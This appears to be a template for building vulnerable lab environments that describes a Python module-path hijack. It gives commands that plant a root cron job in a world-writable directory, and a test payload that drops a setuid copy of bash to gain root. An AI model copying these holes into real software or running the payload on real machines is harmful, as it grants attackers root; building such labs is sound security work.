x---
id: python_path_hijack
description: A privileged Python script imports a module from a directory that is writable by a low-privilege user, allowing module shadowing and code execution as the privileged user.
required_vars: [script_path, hijackable_module, writable_dir]
---
# Atom: Python Path Hijack
A script running with elevated privileges (via sudo, cron, or a SUID wrapper) imports a Python module. A directory earlier in `sys.path` (or in `PYTHONPATH`) is writable by a low-priv user. The attacker plants a malicious file named `<hijackable_module>.py` in that directory, which is loaded instead of the real module.

### Logic Requirements:
1. Create the privileged Python script at `<script_path>` that imports `<hijackable_module>`.
2. Create the writable directory at `<writable_dir>` and insert it first in the script's effective `sys.path` (via a `.pth` file, `PYTHONPATH` in the cron environment, or by placing the script in the writable directory).
3. Set world-writable permissions on `<writable_dir>`: `chmod 777 <writable_dir>`
4. This atom is typically composed with `cron_job_hijack` or `sudoers_no_passwd` to provide the privilege that runs the script.

### Common Patterns:
- **Writable Directory in Script's CWD (simplest):**
  ```bash
  mkdir -p /opt/app
  chmod 777 /opt/app
  cat > /opt/app/run.py << 'EOF'
  import utils  # hijackable
  utils.cleanup()
  EOF
  # Cron runs: python3 /opt/app/run.py as root; CWD is /opt/app which is writable
  echo "* * * * * root cd /opt/app && python3 run.py" > /etc/cron.d/app
  ```
- **Writable .pth File in site-packages:**
  ```bash
  # A writable .pth file can prepend arbitrary directories to sys.path
  chmod 666 /usr/lib/python3/dist-packages/custom.pth
  ```
- **PYTHONPATH Injection via Writable Environment File:**
  Combined with `exposed_env_vars` — set `PYTHONPATH=/tmp` in `/etc/environment` and make `/tmp` the module search path.

### Testing Guidance:
1. Verify the script imports the target module: `grep -n "import <hijackable_module>" <script_path>`
2. Verify `<writable_dir>` is writable by the low-priv user: `ls -ld <writable_dir>`
3. As the low-priv user, create a malicious module:
   ```bash
   echo -e "import os\nos.system('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash')" > <writable_dir>/<hijackable_module>.py
   ```
4. Trigger the privileged script (wait for cron, or use sudo): verify `/tmp/rootbash -p -c 'id'` returns `uid=0(root)`.

### Synthesis Guidance:
Choose a `hijackable_module` name that sounds like an internal utility (e.g. `utils`, `config`, `helpers`, `db`). The `writable_dir` should be an application directory rather than `/tmp` to be realistic. This atom must be composed with at least one privilege-granting atom (`cron_job_hijack` or `sudoers_no_passwd`) to be exploitable. The Builder should note this dependency in a comment within the generated script.
